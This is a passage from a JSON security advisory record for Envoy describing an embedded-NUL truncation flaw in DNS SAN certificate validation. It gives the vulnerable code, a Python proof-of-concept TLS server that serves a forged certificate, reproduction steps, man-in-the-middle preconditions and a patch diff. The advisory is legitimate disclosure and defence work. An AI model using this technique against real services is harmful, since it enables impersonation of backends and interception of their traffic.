"vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"}, "cvss_severities": {"cvss_v3": {"score": 4.4, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"}, "cvss_v4": {"score": null, "vector_string": null}}, "cwe_ids": ["CWE-20"], "cwes": [{"cwe_id": "CWE-20", "name": "Improper Input Validation"}], "description": "### Summary
Improper Certificate Validation (Embedded NUL Truncation) in Envoy Default TLS Certificate Validator. 
Severity: MEDIUM (Host Authentication Bypass / MITM) 
Affected Code: DefaultCertValidator::verifySubjectAltName (source/common/tls/cert_validator/default_validator.cc:399)

### Details
Envoy's standard TLS component validates the Subject Alternative Name (SAN) of certificates to ensure it matches the target upstream host.

A structural flaw was identified in DefaultCertValidator::verifySubjectAltName where the extracted DNS SAN string is cast to a C-style string using .c_str() before being passed to the Utility::dnsNameMatch() algorithm:

// source/common/tls/cert_validator/default_validator.cc
```
const std::string san = Utility::generalNameAsString(general_name);
for (auto& config_san : subject_alt_names) {
  if (general_name->type == GEN_DNS ? Utility::dnsNameMatch(config_san, san.c_str())
                                    : config_san == san) {
    return true;
  }
}
```
If the attacker serves a certificate with a dNSName SAN containing an embedded NUL byte, such as example.com\0.attacker.com, the helper Utility::generalNameAsString captures the complete string including the NUL. However, when .c_str() evaluates it, implicit conversion to absl::string_view inside dnsNameMatch relies on strlen(), prematurely truncating the evaluation context to just example.com.

Envoy evaluates example.com against the exact required config_san match and returns true, thereby successfully validating example.com\0.attacker.com for an upstream routing to example.com.

This only affects DNS SANs; other SAN types (such as URI) and handled correctly.

### PoC
Setup a Python framework establishing a dummy TLS server equipped with the NUL-prefixed certificate.

```
#!/usr/bin/env python3
import socket
import ssl
import argparse
import sys

# --------------------------------------------------------------------------
# Concept script outlining embedded NUL deployment against Envoy validation.
# Warning: Generating actual certificates with embedded NULs requires 
# patching local CA configs or exploiting susceptible enterprise CAs.
# --------------------------------------------------------------------------

def serve_malicious_cert(cert_path, key_path, host, port):
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    
    try:
        context.load_cert_chain(certfile=cert_path, keyfile=key_path)
    except ssl.SSLError as e:
        print(f"[-] Failed to load forged cert. (Python SSL inherently may block NULs deeply!): {e}")
        return

    bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bindsocket.bind((host, port))
    bindsocket.listen(5)
    print(f"[*] Attacker proxy serving malicious TLS cert on {host}:{port}")

    while True:
        newsocket, fromaddr = bindsocket.accept()
        print(f"[*] TLS Connection initiated from {fromaddr}")
        try:
            conn = context.wrap_socket(newsocket, server_side=True)
            print("[+] TLS Handshake completed. Envoy validated the truncated SAN successfully!")
            
            data = conn.recv(1024)
            if data:
                print("[*] Egress traffic hijacked:", data)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 17\r\n\r\nExploited routing")
            conn.close()
        except ssl.SSLError as e:
            print(f"[-] Connection rejected by Envoy validation: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Envoy Embedded NUL Truncation Reproducer")
    parser.add_argument("--cert", default="forged_cert.pem", help="Path to cert with (example.com\\0.evil.com) SAN")
    parser.add_argument("--key", default="forged_key.pem", help="Path to matching private key")
    parser.add_argument("--port", type=int, default=8443)
    args = parser.parse_args()

    serve_malicious_cert(args.cert, args.key, "0.0.0.0", args.port)
```

Configure Envoy to use `auto_sni` and `auto_san_validation` for upstream connections with a DFP cluster. 

Change /etc/hosts (Linux/macOS) or C:\Windows\System32\drivers\etc\hosts (Windows) file to redirect `www.example.com` to `127.0.0.1`.

Use curl to send HTTPS request to example.com

### Impact
If Envoy is configured to validate upstream SANs via `auto_sni` and `auto_san_validation`; AND
if the CAs included in the trust_chain_verification validation fail to universally reject embedded NUL characters (which frequently occurs in lax enterprise/private PKI deployments, but less so in WebPKI), an attacker can maliciously authenticate themselves as any targeted backend service. This bypasses backend transport security integrity natively assumed by Envoy's cluster egress topologies.

An attacker obtains a TLS certificate from an authority present in Envoy's trusted CA bundle where the dNSName extension contains an embedded NUL explicitly prefixing the victim's domain.
The attacker achieves network positioning (e.g., DNS poisoning, BGP hijacking) to Man-In-The-Middle (MITM) the data-plane traffic headed to the upstream example.com and replies using the forged certificate.

### Mitigation
Remove the .c_str() cast in DefaultCertValidator::verifySubjectAltName. Direct usage of the std::string guarantees the correct dimension mapping when passed as absl::string_view, protecting validation against embedded string termination manipulation.

--- source/common/tls/cert_validator/default_validator.cc
+++ source/common/tls/cert_validator/default_validator.cc
@@ -396,7 +396,7 @@
   for (const GENERAL_NAME* general_name : san_names.get()) {
     const std::string san = Utility::generalNameAsString(general_name);
     for (auto& config_san : subject_alt_names) {
-      if (general_name->type == GEN_DNS ? Utility::dnsNameMatch(config_san, san.c_str())
+      if (general_name->type == GEN_DNS ? Utility::dnsNameMatch(config_san, san)
                                         : config_san == san) {
         return true;
       }
An explicit runtime check rejecting any SAN presenting an internal NUL byte serves as an even more profound variant.

(Auth Bypass)", "updated_at": "2026-06-23T14:04:32Z", "url": "https://api.github.com/repos/envoyproxy/envoy/security-advisories/GHSA-f8x4-rw5x-f3r7", "vulnerabilities": [{"package": {"ecosystem": "go", "name": "github.com/envoyproxy/envoy"}, "patched_versions": "1.35.13 1.36.9 1.37.5 1.38.3", "vulnerable_functions": [], "vulnerable_version_range": "<= 1.38"}], "withdrawn_at": null}

title: Embedded NUL in TLS DNS SAN Truncation in the Default TLS Certificate Validator. (Auth Bypass)
